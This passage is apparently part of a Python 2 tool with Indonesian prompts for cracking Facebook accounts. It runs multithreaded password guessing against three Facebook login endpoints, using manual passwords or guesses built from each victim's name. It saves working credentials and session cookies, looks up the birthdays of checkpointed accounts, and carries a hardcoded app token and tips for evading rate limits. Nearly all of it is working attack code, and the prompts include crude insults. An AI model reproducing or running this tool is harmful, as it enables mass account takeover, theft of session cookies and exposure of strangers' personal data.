        _agen_ = raw_input(' [%s?%s] Masukan User Agent Hp Anda :%s ' % (O, N, H))
        open('YNTKTS.txt', 'w').write(_agen_)
        time.sleep(2)
        jalan('\n %s[%s\xe2\x9c\x93%s] Berhasil Menggunakan User Agent Hp Anda...' % (N, H, N))
        raw_input('\n  %s[ %skembali%s ]' % (N, O, N))
        moch_yayan()
    elif _asu_ in ('T', 't'):
        _agen_ = raw_input(' [%s?%s] masukan user agent :%s ' % (O, N, H))
        open('YNTKTS.txt', 'w').write(_agen_)
        time.sleep(2)
        jalan('\n %s[%s\xe2\x9c\x93%s] Berhasil Mengganti User Agent...' % (N, H, N))
        raw_input('\n  %s[ %skembali%s ]' % (N, O, N))
        moch_yayan()
    else:
        print '\n %s[%s!%s] Y/t ngentod' % (N, M, N)
        yo_ndak_tau_ko_tanya_saia()


class __crack__():

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [%s?%s] Masukan File : ' % (O, N))
            self.id = open(self.apk).read().splitlines()
            print '\n [%s+%s] Total Id \xe2\x80\xa2> %s%s%s' % (O, N, M, len(self.id), N)
        except:
            print '\n %s[%s\xc3\x97%s] File [%s%s%s] Tidak Ada, Dump Id Dulu Bro Cek Nomor 1 Sampai 4' % (N, M, N, M, self.apk, N)
            time.sleep(3)
            raw_input('\n  %s[ %skembali%s ]' % (N, O, N))
            moch_yayan()

        ___yayanganteng___ = raw_input(' [%s?%s] Do You Want To Use Manual Password? [Y/t]: ' % (O, N))
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n %s[%s!%s] Gunakan , (Koma) Untuk Pemisah Contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih' % (N, M, N)
            while True:
                pwek = raw_input('\n [%s?%s] Masukan Kata Sandi : ' % (O, N))
                print ' [*] Crack Dengan Sandi \xe2\x80\xa2> [ %s%s%s ]' % (M, pwek, N)
                if pwek == '':
                    print '\n %s[%s\xc3\x97%s] Jangan Kosong Bro Kata Sandi Nya' % (N, M, N)
                elif len(pwek) <= 5:
                    print '\n %s[%s\xc3\x97%s] kata sandi minimal 6 karakter' % (N, M, N)
                else:

                    def __yan__(ysc=None):
                        global cp
                        global ok
                        cin = raw_input('\n [\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m] Methode : ')
                        if cin == '':
                            print '\n %s[%s\xc3\x97%s] Jangan Kosong Bro' % (N, M, N)
                            __yan__()()
                        elif cin == '1':
                            print '\n [%s+%s] Hasil OK Disimpan Ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print ' [%s+%s] Hasil CP Disimpan Ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n' % (M, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                        elif cin == '2':
                            print '\n [%s+%s] Hasil OK Disimpan Ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print ' [%s+%s] Hasil CP Disimpan Ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\n [%s!%s] Anda Bisa Mematikan Data Selular Untuk Menjeda Proses Crack\n' % (M, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                        elif cin == '3':
                            print '\n [%s+%s] hasil OK disimpan ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print ' [%s+%s] hasil CP disimpan ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
                            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n' % (M, N)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __yayanXD__.submit(self.__mfb, __, kimochi, ysc)
                                    except:
                                        pass

                            os.remove(self.apk)
                            hasil(ok, cp)
                        else:
                            print '\n %s[%s\xc3\x97%s] Input Yang Bener' % (N, M, N)
                            __yan__()

                    print '\n [ Pilih Method Login Silahkan Coba Satu\xc2\xb2 ]\n'
                    print ' [%s1%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method API [\x1b[1;92mFast\x1b[1;97m]' % (O, N)
                    print ' [%s2%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method Mbasic [\x1b[1;92mSlow\x1b[1;97m]' % (O, N)
                    print ' [%s3%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method Mobile [\x1b[1;92mSuper Slow\x1b[1;97m]' % (O, N)
                    __yan__(pwek.split(','))
                    break

        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ Pilih Method Login Silahkan Coba Satu\xc2\xb2 ]\n'
            print ' [%s1%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method API [\x1b[1;92mFast\x1b[1;97m]' % (O, N)
            print ' [%s2%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method Mbasic [\x1b[1;92mSlow\x1b[1;97m]' % (O, N)
            print ' [%s3%s]\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m Method Mobile [\x1b[1;92mSuper Slow\x1b[1;97m]' % (O, N)
            self.__pler__()
        else:
            print '\n %s[%s\xc3\x97%s] Y/t Juancok!' % (N, M, N)
            self.plerr()
        return

    def __api__(self, user, __yan__):
        global loop
        (sys.stdout.write('\r %s\xe2\x97\x8d\xe2\x9e\xa4%s CRACK %s/%s \xe2\x80\xa2> [OK-:%s] - [CP-:%s] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _kontol, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if response.status_code != 200:
                (
                 sys.stdout.write('\r %s[%s!%s] If No Result Use Airplane Mode 1 Second' % (N, M, N)),)
                sys.stdout.flush()
                loop += 1
                self.__api__()
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r %s[ANGGA_OK] %s|%s                 %s' % (H, user, pw, N)
                wrt = ' [\xe2\x9c\x93] %s|%s' % (user, pw)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r %s\xe2\x97\x8d\xe2\x9e\xa4%s CRACK %s/%s \xe2\x80\xa2> [OK-:%s] - [CP-:%s] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ANGGA_OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r %s\xe2\x97\x8d\xe2\x9e\xa4%s CRACK %s/%s \xe2\x80\xa2> [OK-:%s] - [CP-:%s] ' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('results')
            except:
                pass

            try:
                _kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _kontol, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ANGGA_OK] %s|%s|%s                 %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.memek.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s' % (user, kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r %s[ANGGA_CP] %s|%s|%s %s %s     %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r %s[ANGGA_CP] %s|%s                %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
            else:
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [\x1b[1;96m\xe2\x97\x8d\xe2\x9e\xa4\x1b[1;97m] Methode : ')
        if yan == '':
            print '\n %s[%s\xc3\x97%s] Jangan Kosong Bos' % (N, M, N)
            self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] Hasil OK Disimpan Ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print ' [%s+%s] Hasil CP Disimpan Ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n' % (M, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] Hasil OK Disimpan Ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print ' [%s+%s] Hasil CP Disimpan Ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n' % (M, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] Hasil OK Disimpan Ke \xe2\x80\xa2> results/OK-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print ' [%s+%s] Hasil CP Disimpan Ke \xe2\x80\xa2> results/CP-%s-%s-%s.txt' % (O, N, ha, op, ta)
            print '\n [%s!%s] If No Result Use Airplane Mode 1 Second\n' % (M, N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
                for yntkts in self.id:
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        else:
                            pwx = [
                             name, xz[0] + '123', xz[0] + '12345']
                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok, cp)
        else:
            print '\n %s[%s\xc3\x97%s] Input Yang Bener' % (N, M, N)
            self.__pler__()


if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()
